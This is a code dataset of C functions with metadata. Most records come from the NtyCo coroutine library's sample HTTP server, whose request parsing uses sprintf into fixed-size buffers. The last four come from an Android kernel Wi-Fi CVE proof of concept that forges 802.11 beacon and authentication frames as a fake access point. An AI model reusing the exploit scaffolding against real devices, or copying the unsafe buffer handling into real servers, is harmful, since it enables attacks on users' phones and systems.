{"docstring": "/**********************************************************************/\n/* A request has caused a call to accept() on the server port to\n * return.  Process the request appropriately.\n * Parameters: the socket connected to the client */\n/**********************************************************************/\n", "func_signal": "void accept_request(void *arg)", "code": "{\n    int *pclient = (int*)arg;\n\tint client = *pclient;\n\t\n    char buf[1024];\n    size_t numchars;\n    char method[16];\n    char url[32];\n    char path[64];\n    size_t i, j;\n    struct stat st;\n    int cgi = 0;      /* becomes true if server decides this is a CGI\n                       * program */\n    char *query_string = NULL;\n\n    numchars = recv(client, buf, sizeof(buf), 0);\n\n    i = 0; j = 0;\n    while (!ISspace(buf[i]) && (i < sizeof(method) - 1))\n    {\n        method[i] = buf[i];\n        i++;\n    }\n    j=i;\n    method[i] = '\\0';\n\n    if (strcasecmp(method, \"GET\") && strcasecmp(method, \"POST\"))\n    {\n        unimplemented(client);\n        return;\n    }\n\n    if (strcasecmp(method, \"POST\") == 0)\n        cgi = 1;\n\n    i = 0;\n    while (ISspace(buf[j]) && (j < numchars))\n        j++;\n    while (!ISspace(buf[j]) && (i < sizeof(url) - 1) && (j < numchars))\n    {\n        url[i] = buf[j];\n        i++; j++;\n    }\n    url[i] = '\\0';\n\n    if (strcasecmp(method, \"GET\") == 0)\n    {\n        query_string = url;\n        while ((*query_string != '?') && (*query_string != '\\0'))\n            query_string++;\n        if (*query_string == '?')\n        {\n            cgi = 1;\n            *query_string = '\\0';\n            query_string++;\n        }\n    }\n\n    sprintf(path, \"htdocs%s\", url);\n    if (path[strlen(path) - 1] == '/')\n        strcat(path, \"index.html\");\n    if (stat(path, &st) == -1) {\n        while ((numchars > 0) && strcmp(\"\\n\", buf))  /* read & discard headers */\n            numchars = get_line(client, buf, sizeof(buf));\n        not_found(client);\n    }\n    else\n    {\n        if ((st.st_mode & S_IFMT) == S_IFDIR)\n            strcat(path, \"/index.html\");\n        if ((st.st_mode & S_IXUSR) ||\n                (st.st_mode & S_IXGRP) ||\n                (st.st_mode & S_IXOTH)    )\n            cgi = 1;\n\n\t\tcgi = 0;\n\n        if (!cgi)\n            serve_file(client, path);\n        else\n            execute_cgi(client, path, method, query_string);\n    }\n\n    close(client);\n\tfree(pclient);\n}", "path": "NtyCo/sample/nty_http_server_mulcore.c", "commit_date": "2020-07-08 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "/*\n * nty_poll_inner --> 1. sockfd--> epoll, 2 yield, 3. epoll x sockfd\n * fds : \n */\n", "func_signal": "static int nty_poll_inner(struct pollfd *fds, nfds_t nfds, int timeout)", "code": "{\n\n\tif (timeout == 0)\n\t{\n\t\treturn poll(fds, nfds, timeout);\n\t}\n\tif (timeout < 0)\n\t{\n\t\ttimeout = INT_MAX;\n\t}\n\n\tnty_schedule *sched = nty_coroutine_get_sched();\n\tnty_coroutine *co = sched->curr_thread;\n\t\n\tint i = 0;\n\tfor (i = 0;i < nfds;i ++) {\n\t\n\t\tstruct epoll_event ev;\n\t\tev.events = nty_pollevent_2epoll(fds[i].events);\n\t\tev.data.fd = fds[i].fd;\n\t\tepoll_ctl(sched->poller_fd, EPOLL_CTL_ADD, fds[i].fd, &ev);\n\n\t\tco->events = fds[i].events;\n\t\tnty_schedule_sched_wait(co, fds[i].fd, fds[i].events, timeout);\n\t}\n\tnty_coroutine_yield(co); \n\n\tfor (i = 0;i < nfds;i ++) {\n\t\n\t\tstruct epoll_event ev;\n\t\tev.events = nty_pollevent_2epoll(fds[i].events);\n\t\tev.data.fd = fds[i].fd;\n\t\tepoll_ctl(sched->poller_fd, EPOLL_CTL_DEL, fds[i].fd, &ev);\n\n\t\tnty_schedule_desched_wait(fds[i].fd);\n\t}\n\n\treturn nfds;\n}", "path": "NtyCo/core/nty_socket.c", "commit_date": "2019-03-15 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "//recv \n// add epoll first\n//\n", "func_signal": "ssize_t nty_recv(int fd, void *buf, size_t len, int flags)", "code": "{\n\t\n\tstruct pollfd fds;\n\tfds.fd = fd;\n\tfds.events = POLLIN | POLLERR | POLLHUP;\n\n\tnty_poll_inner(&fds, 1, 1);\n\n\tint ret = recv(fd, buf, len, flags);\n\tif (ret < 0) {\n\t\t//if (errno == EAGAIN) return ret;\n\t\tif (errno == ECONNRESET) return -1;\n\t\t//printf(\"recv error : %d, ret : %d\\n\", errno, ret);\n\t\t\n\t}\n\treturn ret;\n}", "path": "NtyCo/core/nty_socket.c", "commit_date": "2019-03-15 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "/**********************************************************************/\n/* This function starts the process of listening for web connections\n * on a specified port.  If the port is 0, then dynamically allocate a\n * port and modify the original port variable to reflect the actual\n * port.\n * Parameters: pointer to variable containing the port to connect on\n * Returns: the socket */\n/**********************************************************************/\n", "func_signal": "int startup(u_short *port)", "code": "{\n    int httpd = 0;\n    int on = 1;\n    struct sockaddr_in name;\n\n    httpd = socket(PF_INET, SOCK_STREAM, 0);\n    if (httpd == -1)\n        error_die(\"socket\");\n    memset(&name, 0, sizeof(name));\n    name.sin_family = AF_INET;\n    name.sin_port = htons(*port);\n    name.sin_addr.s_addr = htonl(INADDR_ANY);\n    if ((setsockopt(httpd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on))) < 0)  \n    {  \n        error_die(\"setsockopt failed\");\n    }\n    if (bind(httpd, (struct sockaddr *)&name, sizeof(name)) < 0)\n        error_die(\"bind\");\n    if (*port == 0)  /* if dynamically allocating a port */\n    {\n        socklen_t namelen = sizeof(name);\n        if (getsockname(httpd, (struct sockaddr *)&name, &namelen) == -1)\n            error_die(\"getsockname\");\n        *port = ntohs(name.sin_port);\n    }\n    if (listen(httpd, 5) < 0)\n        error_die(\"listen\");\n\n\t\n    return(httpd);\n}", "path": "NtyCo/sample/nty_http_server.c", "commit_date": "2018-08-21 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "/**********************************************************************/\n/* Return the informational HTTP headers about a file. */\n/* Parameters: the socket to print the headers on\n *             the name of the file */\n/**********************************************************************/\n", "func_signal": "void headers(int client, const char *filename)", "code": "{\n    char buf[1024] = {0};\n    (void)filename;  /* could use filename to determine file type */\n\t\n#if ENABLE_NTYCO\n   \n\n\tsprintf(buf, \"HTTP/1.0 200 OK\\r\\n\");\n\tstrcat(buf, SERVER_STRING);\n\tstrcat(buf, \"Content-Type: text/html\\r\\n\");\n\tstrcat(buf, \"\\r\\n\");\n\n\tsend(client, buf, strlen(buf), 0);\n\t\n#else\n\tstrcpy(buf, \"HTTP/1.0 200 OK\\r\\n\");\n\tsend(client, buf, strlen(buf), 0);\n\tstrcpy(buf, SERVER_STRING);\n\tsend(client, buf, strlen(buf), 0);\n\tsprintf(buf, \"Content-Type: text/html\\r\\n\");\n\tsend(client, buf, strlen(buf), 0);\n\tstrcpy(buf, \"\\r\\n\");\n\tsend(client, buf, strlen(buf), 0);\n\t\n#endif\n}", "path": "NtyCo/sample/nty_http_server_mulcore.c", "commit_date": "2020-07-08 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "/**********************************************************************/\n/* Inform the client that a CGI script could not be executed.\n * Parameter: the client socket descriptor. */\n/**********************************************************************/\n", "func_signal": "void cannot_execute(int client)", "code": "{\n    char buf[1024];\n\n    sprintf(buf, \"HTTP/1.0 500 Internal Server Error\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"Content-type: text/html\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"<P>Error prohibited CGI execution.\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n}", "path": "NtyCo/sample/nty_http_server.c", "commit_date": "2018-08-21 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "/**********************************************************************/\n/* Get a line from a socket, whether the line ends in a newline,\n * carriage return, or a CRLF combination.  Terminates the string read\n * with a null character.  If no newline indicator is found before the\n * end of the buffer, the string is terminated with a null.  If any of\n * the above three line terminators is read, the last character of the\n * string will be a linefeed and the string will be terminated with a\n * null character.\n * Parameters: the socket descriptor\n *             the buffer to save the data in\n *             the size of the buffer\n * Returns: the number of bytes stored (excluding null) */\n/**********************************************************************/\n", "func_signal": "int get_line(int sock, char *buf, int size)", "code": "{\n    int i = 0;\n    char c = '\\0';\n    int n;\n\n    while ((i < size - 1) && (c != '\\n'))\n    {\n\n\t\tn = recv(sock, &c, 1, 0);\n\n        if (n > 0)\n        {\n            if (c == '\\r')\n            {\n                n = recv(sock, &c, 1, MSG_PEEK);\n\n                if ((n > 0) && (c == '\\n'))\n                    recv(sock, &c, 1, 0);\n                else\n                    c = '\\n';\n            }\n            buf[i] = c;\n            i++;\n        }\n        else\n            c = '\\n';\n    }\n    buf[i] = '\\0';\n\n    return(i);\n}", "path": "NtyCo/sample/nty_http_server.c", "commit_date": "2018-08-21 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "/**********************************************************************/\n/* Inform the client that a CGI script could not be executed.\n * Parameter: the client socket descriptor. */\n/**********************************************************************/\n", "func_signal": "void cannot_execute(int client)", "code": "{\n    char buf[1024];\n\n    sprintf(buf, \"HTTP/1.0 500 Internal Server Error\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"Content-type: text/html\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"<P>Error prohibited CGI execution.\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n}", "path": "NtyCo/sample/nty_http_server_mulcore.c", "commit_date": "2020-07-08 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "/**********************************************************************/\n/* Inform the client that a request it has made has a problem.\n * Parameters: client socket */\n/**********************************************************************/\n", "func_signal": "void bad_request(int client)", "code": "{\n    char buf[1024];\n\n    sprintf(buf, \"HTTP/1.0 400 BAD REQUEST\\r\\n\");\n    send(client, buf, sizeof(buf), 0);\n    sprintf(buf, \"Content-type: text/html\\r\\n\");\n    send(client, buf, sizeof(buf), 0);\n    sprintf(buf, \"\\r\\n\");\n    send(client, buf, sizeof(buf), 0);\n    sprintf(buf, \"<P>Your browser sent a bad request, \");\n    send(client, buf, sizeof(buf), 0);\n    sprintf(buf, \"such as a POST without a Content-Length.\\r\\n\");\n    send(client, buf, sizeof(buf), 0);\n}", "path": "NtyCo/sample/nty_http_server_mulcore.c", "commit_date": "2020-07-08 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "/**********************************************************************/\n/* Give a client a 404 not found status message. */\n/**********************************************************************/\n", "func_signal": "void not_found(int client)", "code": "{\n    char buf[1024];\n#if ENABLE_NTYCO\n\n\tsprintf(buf, \"HTTP/1.0 404 NOT FOUND\\r\\n\");\n\tstrcat(buf, SERVER_STRING);\n\tstrcat(buf, \"Content-Type: text/html\\r\\n\");\n\tstrcat(buf, \"\\r\\n\");\n\tstrcat(buf, \"<HTML><TITLE>Not Found</TITLE>\\r\\n\");\n\tstrcat(buf, \"<BODY><P>The server could not fulfill\\r\\n\");\n\tstrcat(buf, \"your request because the resource specified\\r\\n\");\n\tstrcat(buf, \"is unavailable or nonexistent.\\r\\n\");\n\tstrcat(buf, \"</BODY></HTML>\\r\\n\");\n\n\tsend(client, buf, strlen(buf), 0);\n\n#else\n    sprintf(buf, \"HTTP/1.0 404 NOT FOUND\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, SERVER_STRING);\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"Content-Type: text/html\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"<HTML><TITLE>Not Found</TITLE>\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"<BODY><P>The server could not fulfill\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"your request because the resource specified\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"is unavailable or nonexistent.\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"</BODY></HTML>\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n#endif\n}", "path": "NtyCo/sample/nty_http_server_mulcore.c", "commit_date": "2020-07-08 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "/**********************************************************************/\n/* Inform the client that the requested web method has not been\n * implemented.\n * Parameter: the client socket */\n/**********************************************************************/\n", "func_signal": "void unimplemented(int client)", "code": "{\n    char buf[1024];\n#if ENABLE_NTYCO\n    sprintf(buf, \"HTTP/1.0 501 Method Not Implemented\\r\\n\");\n\tstrcat(buf, SERVER_STRING);\n\tstrcat(buf, \"Content-Type: text/html\\r\\n\");\n\tstrcat(buf, \"\\r\\n\");\n\tstrcat(buf, \"<HTML><HEAD><TITLE>Method Not Implemented\\r\\n\");\n\tstrcat(buf, \"</TITLE></HEAD>\\r\\n\");\n\tstrcat(buf, \"<BODY><P>HTTP request method not supported.\\r\\n\");\n\tstrcat(buf, \"</BODY></HTML>\\r\\n\");\n\n\tsend(client, buf, strlen(buf), 0);\n#else\n\tsprintf(buf, \"HTTP/1.0 501 Method Not Implemented\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, SERVER_STRING);\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"Content-Type: text/html\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"<HTML><HEAD><TITLE>Method Not Implemented\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"</TITLE></HEAD>\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"<BODY><P>HTTP request method not supported.\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"</BODY></HTML>\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n#endif\n}", "path": "NtyCo/sample/nty_http_server_mulcore.c", "commit_date": "2020-07-08 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "/**********************************************************************/\n/* This function starts the process of listening for web connections\n * on a specified port.  If the port is 0, then dynamically allocate a\n * port and modify the original port variable to reflect the actual\n * port.\n * Parameters: pointer to variable containing the port to connect on\n * Returns: the socket */\n/**********************************************************************/\n", "func_signal": "int startup(u_short *port)", "code": "{\n    int httpd = 0;\n    int on = 1;\n    struct sockaddr_in name;\n\n    httpd = socket(PF_INET, SOCK_STREAM, 0);\n    if (httpd == -1)\n        error_die(\"socket\");\n    memset(&name, 0, sizeof(name));\n    name.sin_family = AF_INET;\n    name.sin_port = htons(*port);\n    name.sin_addr.s_addr = htonl(INADDR_ANY);\n    if ((setsockopt(httpd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on))) < 0)  \n    {  \n        error_die(\"setsockopt failed\");\n    }\n    if (bind(httpd, (struct sockaddr *)&name, sizeof(name)) < 0)\n        error_die(\"bind\");\n    if (*port == 0)  /* if dynamically allocating a port */\n    {\n        socklen_t namelen = sizeof(name);\n        if (getsockname(httpd, (struct sockaddr *)&name, &namelen) == -1)\n            error_die(\"getsockname\");\n        *port = ntohs(name.sin_port);\n    }\n    if (listen(httpd, 5) < 0)\n        error_die(\"listen\");\n\n\t\n    return(httpd);\n}", "path": "NtyCo/sample/nty_http_server_mulcore.c", "commit_date": "2020-07-08 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "/**********************************************************************/\n/* Put the entire contents of a file out on a socket.  This function\n * is named after the UNIX \"cat\" command, because it might have been\n * easier just to do something like pipe, fork, and exec(\"cat\").\n * Parameters: the client socket descriptor\n *             FILE pointer for the file to cat */\n/**********************************************************************/\n", "func_signal": "void cat(int client, FILE *resource)", "code": "{\n    char buf[1024];\n\n    char *ch = fgets(buf, sizeof(buf), resource);\n    while (!feof(resource))\n    {\n        send(client, buf, strlen(buf), 0);\n        ch = fgets(buf, sizeof(buf), resource);\n    }\n}", "path": "NtyCo/sample/nty_http_server.c", "commit_date": "2018-08-21 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "/**********************************************************************/\n/* Return the informational HTTP headers about a file. */\n/* Parameters: the socket to print the headers on\n *             the name of the file */\n/**********************************************************************/\n", "func_signal": "void headers(int client, const char *filename)", "code": "{\n    char buf[1024];\n    (void)filename;  /* could use filename to determine file type */\n\n    strcpy(buf, \"HTTP/1.0 200 OK\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    strcpy(buf, SERVER_STRING);\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"Content-Type: text/html\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    strcpy(buf, \"\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n}", "path": "NtyCo/sample/nty_http_server.c", "commit_date": "2018-08-21 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "/**********************************************************************/\n/* Execute a CGI script.  Will need to set environment variables as\n * appropriate.\n * Parameters: client socket descriptor\n *             path to the CGI script */\n/**********************************************************************/\n", "func_signal": "void execute_cgi(int client, const char *path,\n        const char *method, const char *query_string)", "code": "{\n    char buf[1024];\n    int cgi_output[2];\n    int cgi_input[2];\n    pid_t pid;\n    int status;\n    int i;\n    char c;\n    int numchars = 1;\n    int content_length = -1;\n\n    buf[0] = 'A'; buf[1] = '\\0';\n    if (strcasecmp(method, \"GET\") == 0)\n        while ((numchars > 0) && strcmp(\"\\n\", buf))  /* read & discard headers */\n            numchars = get_line(client, buf, sizeof(buf));\n    else if (strcasecmp(method, \"POST\") == 0) /*POST*/\n    {\n        numchars = get_line(client, buf, sizeof(buf));\n        while ((numchars > 0) && strcmp(\"\\n\", buf))\n        {\n            buf[15] = '\\0';\n            if (strcasecmp(buf, \"Content-Length:\") == 0)\n                content_length = atoi(&(buf[16]));\n            numchars = get_line(client, buf, sizeof(buf));\n        }\n        if (content_length == -1) {\n            bad_request(client);\n            return;\n        }\n    }\n    else/*HEAD or other*/\n    {\n    }\n\n\n    if (pipe(cgi_output) < 0) {\n        cannot_execute(client);\n        return;\n    }\n    if (pipe(cgi_input) < 0) {\n        cannot_execute(client);\n        return;\n    }\n\n    if ( (pid = fork()) < 0 ) {\n        cannot_execute(client);\n        return;\n    }\n    sprintf(buf, \"HTTP/1.0 200 OK\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    if (pid == 0)  /* child: CGI script */\n    {\n        char meth_env[255];\n        char query_env[255];\n        char length_env[255];\n\n        dup2(cgi_output[1], STDOUT);\n        dup2(cgi_input[0], STDIN);\n        close(cgi_output[0]);\n        close(cgi_input[1]);\n        sprintf(meth_env, \"REQUEST_METHOD=%s\", method);\n        putenv(meth_env);\n        if (strcasecmp(method, \"GET\") == 0) {\n            sprintf(query_env, \"QUERY_STRING=%s\", query_string);\n            putenv(query_env);\n        }\n        else {   /* POST */\n            sprintf(length_env, \"CONTENT_LENGTH=%d\", content_length);\n            putenv(length_env);\n        }\n        execl(path, \"\", NULL);\n        exit(0);\n    } else {    /* parent */\n        close(cgi_output[1]);\n        close(cgi_input[0]);\n        if (strcasecmp(method, \"POST\") == 0)\n            for (i = 0; i < content_length; i++) {\n                recv(client, &c, 1, 0);\n                int len = write(cgi_input[1], &c, 1);\n            }\n        while (read(cgi_output[0], &c, 1) > 0)\n            send(client, &c, 1, 0);\n\n        close(cgi_output[0]);\n        close(cgi_input[1]);\n        waitpid(pid, &status, 0);\n    }\n}", "path": "NtyCo/sample/nty_http_server.c", "commit_date": "2018-08-21 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "/**********************************************************************/\n/* Print out an error message with perror() (for system errors; based\n * on value of errno, which indicates system call errors) and exit the\n * program indicating an error. */\n/**********************************************************************/\n", "func_signal": "void error_die(const char *sc)", "code": "{\n    perror(sc);\n    exit(1);\n}", "path": "NtyCo/sample/nty_http_server.c", "commit_date": "2018-08-21 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "/**********************************************************************/\n/* Give a client a 404 not found status message. */\n/**********************************************************************/\n", "func_signal": "void not_found(int client)", "code": "{\n    char buf[1024];\n\n    sprintf(buf, \"HTTP/1.0 404 NOT FOUND\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, SERVER_STRING);\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"Content-Type: text/html\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"<HTML><TITLE>Not Found</TITLE>\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"<BODY><P>The server could not fulfill\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"your request because the resource specified\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"is unavailable or nonexistent.\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    sprintf(buf, \"</BODY></HTML>\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n}", "path": "NtyCo/sample/nty_http_server.c", "commit_date": "2018-08-21 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "/**********************************************************************/\n/* Execute a CGI script.  Will need to set environment variables as\n * appropriate.\n * Parameters: client socket descriptor\n *             path to the CGI script */\n/**********************************************************************/\n", "func_signal": "void execute_cgi(int client, const char *path,\n        const char *method, const char *query_string)", "code": "{\n    char buf[1024];\n    int cgi_output[2];\n    int cgi_input[2];\n    pid_t pid;\n    int status;\n    int i;\n    char c;\n    int numchars = 1;\n    int content_length = -1;\n\n    buf[0] = 'A'; buf[1] = '\\0';\n    if (strcasecmp(method, \"GET\") == 0)\n        while ((numchars > 0) && strcmp(\"\\n\", buf))  /* read & discard headers */\n            numchars = get_line(client, buf, sizeof(buf));\n    else if (strcasecmp(method, \"POST\") == 0) /*POST*/\n    {\n        numchars = get_line(client, buf, sizeof(buf));\n        while ((numchars > 0) && strcmp(\"\\n\", buf))\n        {\n            buf[15] = '\\0';\n            if (strcasecmp(buf, \"Content-Length:\") == 0)\n                content_length = atoi(&(buf[16]));\n            numchars = get_line(client, buf, sizeof(buf));\n        }\n        if (content_length == -1) {\n            bad_request(client);\n            return;\n        }\n    }\n    else/*HEAD or other*/\n    {\n    }\n\n\n    if (pipe(cgi_output) < 0) {\n        cannot_execute(client);\n        return;\n    }\n    if (pipe(cgi_input) < 0) {\n        cannot_execute(client);\n        return;\n    }\n\n    if ( (pid = fork()) < 0 ) {\n        cannot_execute(client);\n        return;\n    }\n    sprintf(buf, \"HTTP/1.0 200 OK\\r\\n\");\n    send(client, buf, strlen(buf), 0);\n    if (pid == 0)  /* child: CGI script */\n    {\n        char meth_env[255];\n        char query_env[255];\n        char length_env[255];\n\n        dup2(cgi_output[1], STDOUT);\n        dup2(cgi_input[0], STDIN);\n        close(cgi_output[0]);\n        close(cgi_input[1]);\n        sprintf(meth_env, \"REQUEST_METHOD=%s\", method);\n        putenv(meth_env);\n        if (strcasecmp(method, \"GET\") == 0) {\n            sprintf(query_env, \"QUERY_STRING=%s\", query_string);\n            putenv(query_env);\n        }\n        else {   /* POST */\n            sprintf(length_env, \"CONTENT_LENGTH=%d\", content_length);\n            putenv(length_env);\n        }\n        execl(path, \"\", NULL);\n        exit(0);\n    } else {    /* parent */\n        close(cgi_output[1]);\n        close(cgi_input[0]);\n        if (strcasecmp(method, \"POST\") == 0)\n            for (i = 0; i < content_length; i++) {\n\n\t\t\t\trecv(client, &c, 1, 0);\n\n                int len = write(cgi_input[1], &c, 1);\n            }\n        while (read(cgi_output[0], &c, 1) > 0)\n\n\t\t\tsend(client, &c, 1, 0);\n\n\n        close(cgi_output[0]);\n        close(cgi_input[1]);\n        waitpid(pid, &status, 0);\n    }\n}", "path": "NtyCo/sample/nty_http_server_mulcore.c", "commit_date": "2020-07-08 00:00:00", "repo_name": "wangbojing/NtyCo", "stars": 754, "license": "None", "language": "c", "size": 5580}
{"docstring": "/*\n * send a beacon frame to announce our network\n */\n", "func_signal": "int send_beacon()", "code": "{\n\tu_int8_t pkt[4096] = { 0 }, *p = pkt;\n\tbeacon_t *bc;\n\n\tfill_radiotap(&p);\n\tfill_dot11(&p, T_MGMT, ST_BEACON, IEEE80211_BROADCAST_ADDR);\n\n\t/* add the beacon info */\n\tbc = (beacon_t *)p;\n\tbc->timestamp = 0;\n\tbc->interval = BEACON_INTERVAL;\n\tbc->caps = 1; // we are an AP ;-)\n\tp = (u_int8_t *)(bc + 1);\n\n\tfill_ie(&p, IEID_SSID, g_ssid, g_ssid_len);\n\tfill_ie(&p, IEID_RATES, (u_int8_t *)\"\\x0c\\x12\\x18\\x24\\x30\\x48\\x60\\x6c\", 8);\n\tfill_ie(&p, IEID_DSPARAMS, &g_channel, 1);\n\n\t/* don't retransmit beacons */\n\tif (send(g_sock, pkt, p - pkt, 0) == -1) {\n\t\tperror(\"[!] Unable to send beacon!\");\n\t\treturn 0;\n\t}\n\n\t//printf(\"[*] Sent beacon!\\n\");\n\treturn 1;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "/*\n * send an 802.11 packet with a bunch of re-transmissions for the fuck of it\n */\n", "func_signal": "int send_packet(dot11_frame_t *d11)", "code": "{\n\tif (send(g_sock, g_pkt, g_pkt_len, 0) == -1) {\n\t\tperror(\"[!] Unable to send packet!\");\n\t\treturn 0;\n\t}\n\n\t/* set the retransmit flag on the 802.11 header */\n\td11->ctrlflags |= CF_RETRY;\n\n\treturn 1;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "/*\n * process the information elements looking for an SSID\n */\n", "func_signal": "ie_t *get_ssid_ie(const u_int8_t *data, u_int32_t left)", "code": "{\n\tie_t *ie;\n\tconst u_int8_t *p = data;\n\tu_int32_t rem = left;\n\n#ifdef DEBUG_GET_SSID_IE\n\tprintf(\"[*] processing information element data:\\n\");\n\thexdump(data, left);\n#endif\n\n\twhile (rem > 0) {\n\t\t/* see if we have enough for the IE header */\n\t\tif (rem < sizeof(*ie)) {\n\t\t\tfprintf(stderr, \"[-] Not enough data for an IE!\\n\");\n\t\t\treturn NULL;\n\t\t}\n\n\t\tie = (ie_t *)p;\n\n\t\t/* advance... */\n\t\tp += sizeof(*ie);\n\t\trem -= sizeof(*ie);\n\n\t\t/* now, is it an SSID ? */\n\t\tif (ie->id == IEID_SSID) {\n\t\t\treturn ie;\n\t\t}\n\n\t\t/* check if we have all the data */\n\t\tif (rem < ie->len) {\n\t\t\tfprintf(stderr, \"[-] Not enough data for the IE's data!\\n\");\n\t\t\treturn NULL;\n\t\t}\n\n\t\t/* advance past the ie->data */\n\t\tp += ie->len;\n\t\trem -= ie->len;\n\t}\n\n#ifdef DEBUG_GET_SSID_IE\n\tfprintf(stderr, \"[-] SSID IE not found!\\n\");\n#endif\n\treturn NULL;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
{"docstring": "/*\n * send an authentication response\n */\n", "func_signal": "int send_auth_response(u_int8_t *dst_mac)", "code": "{\n\tu_int8_t *p = g_pkt;\n\tdot11_frame_t *d11;\n\tauth_t *auth;\n\n\tfill_radiotap(&p);\n\td11 = (dot11_frame_t *)p;\n\tfill_dot11(&p, T_MGMT, ST_AUTH, dst_mac);\n\n\t/* add the auth info */\n\tauth = (auth_t *)p;\n\tauth->algorithm = 0; // AUTH_OPEN;\n\tauth->seq = 2; // should be responding to auth seq 1\n\tauth->status = 0; // successful\n\tp = (u_int8_t *)(auth + 1);\n\n\tg_pkt_len = p - g_pkt;\n\tif (!send_packet(d11))\n\t\treturn 0;\n\n\t//printf(\"[*] Sent auth response to %s!\\n\", mac_string(dst_mac));\n\treturn 1;\n}", "path": "Android_Kernel_CVE_POCs/wifi/CVE-2017-11014.c", "commit_date": "2017-11-16 00:00:00", "repo_name": "ScottyBauer/Android_Kernel_CVE_POCs", "stars": 671, "license": "None", "language": "c", "size": 837}
